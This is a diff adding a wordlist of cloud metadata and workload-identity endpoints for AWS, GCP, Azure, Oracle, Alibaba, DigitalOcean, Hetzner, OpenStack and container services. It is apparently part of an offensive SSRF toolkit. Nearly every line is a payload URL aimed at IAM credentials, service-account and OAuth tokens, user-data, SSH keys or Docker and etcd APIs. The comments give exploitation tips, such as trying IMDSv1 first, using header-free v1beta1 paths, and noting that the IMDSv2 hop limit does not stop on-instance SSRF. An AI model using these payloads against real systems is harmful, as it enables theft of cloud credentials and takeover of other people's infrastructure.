@@ -1,0 +1,121 @@
+# cloud-metadata-endpoints.txt — instance metadata and workload-identity endpoints
+#
+# Used by: nimbus metadata-ssrf skill, metadata-probe.sh, and every SSRF playbook that hands off
+# to ssrf-cloud-metadata. Bare URLs only on non-comment lines, so `grep -v '^#'` still yields a
+# clean list.
+#
+# FINGERPRINT THE PROVIDER FIRST. The same link-local address is used by several providers with
+# completely different path layouts, and two use different addresses entirely. Firing every path
+# at every host is noisy and tells you nothing.
+#
+# HEADER REQUIREMENTS ARE THE KEY CONSTRAINT. A GET-only SSRF primitive cannot set a request
+# header, so the header-free paths below are the ones that matter to it. A primitive that CAN set
+# a method and a header (webhook with custom headers, a renderer executing JavaScript, header
+# injection) reaches everything.
+
+# ---------- AWS EC2 (IMDS) ----------
+# IMDSv1: plain GET, no header. Present on older fleets and anything launched before the default
+# changed. Always try this first.
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/info
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/user-data
+# alternate names and the IPv6 endpoint for the same service
+http://instance-data/latest/meta-data/
+http://[fd00:ec2::254]/latest/meta-data/
+# IMDSv2: token handshake. Needs PUT + a TTL header, then a GET carrying the token header.
+#   PUT http://169.254.169.254/latest/api/token
+#     X-aws-ec2-metadata-token-ttl-seconds: 21600
+#   GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
+#     X-aws-ec2-metadata-token: <token>
+# The hop limit only defeats SSRF originating a hop away (a container behind a bridge, a network
+# proxy). An SSRF in application code ON the instance is the first hop and is unaffected.
+http://169.254.169.254/latest/api/token
+
+# ---------- AWS container and serverless runtimes ----------
+# ECS/Fargate task role credentials. Plain GET, no header. The relative URI comes from the
+# AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variable, readable via file:///proc/self/environ
+# where the primitive supports file://.
+http://169.254.170.2/v2/credentials/
+http://169.254.170.2/v2/metadata
+http://169.254.170.2/v2/stats
+# ECS task metadata v4 endpoint (address supplied via ECS_CONTAINER_METADATA_URI_V4)
+http://169.254.170.2/v4/metadata
+# EKS Pod Identity agent
+http://169.254.170.23/v1/credentials
+# Lambda runtime API — reachable from inside the execution environment
+http://127.0.0.1:9001/2018-06-01/runtime/invocation/next
+# Elastic Beanstalk — recover accountId and region from the identity document, then the role
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# ---------- Google Cloud ----------
+# v1 requires the header  Metadata-Flavor: Google
+# v1beta1 historically did NOT — that is the path a header-less primitive wants. Appending a
+# JSON format parameter also forces a renderable response, which matters for screenshot/PDF channels.
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/
+http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1beta1/
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
+http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
+http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
+# short names and the bare address resolve to the same service
+http://metadata/computeMetadata/v1/
+http://169.254.169.254/computeMetadata/v1/
+
+# ---------- Azure ----------
+# Requires the header  Metadata: true
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2021-02-01&format=text
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
+# Legacy maintenance endpoint, no header on older stacks
+http://169.254.169.254/metadata/v1/maintenance
+
+# ---------- Oracle Cloud ----------
+# Different address entirely on the legacy service; v2 requires  Authorization: Bearer Oracle
+http://192.0.0.192/latest/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/user-data/
+http://169.254.169.254/opc/v1/instance/
+http://169.254.169.254/opc/v2/instance/
+http://169.254.169.254/opc/v2/identity/cert.pem
+
+# ---------- Alibaba Cloud ----------
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+
+# ---------- DigitalOcean ----------
+# No header gate. The single JSON endpoint returns everything at once.
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/id
+
+# ---------- Hetzner Cloud ----------
+http://169.254.169.254/hetzner/v1/metadata
+http://169.254.169.254/hetzner/v1/metadata/private-networks
+
+# ---------- OpenStack / RackSpace ----------
+http://169.254.169.254/openstack
+http://169.254.169.254/openstack/latest/meta_data.json
+http://169.254.169.254/2009-04-04/meta-data/
+
+# ---------- Container and orchestration surfaces reachable from the same position ----------
+# Not metadata services, but the same SSRF lands on them and they hold equivalent secrets.
+http://127.0.0.1:2375/v1.24/containers/json
+http://127.0.0.1:2379/version
+http://127.0.0.1:2379/v2/keys/?recursive=true
+http://127.0.0.1:10255/pods
+http://rancher-metadata/latest/
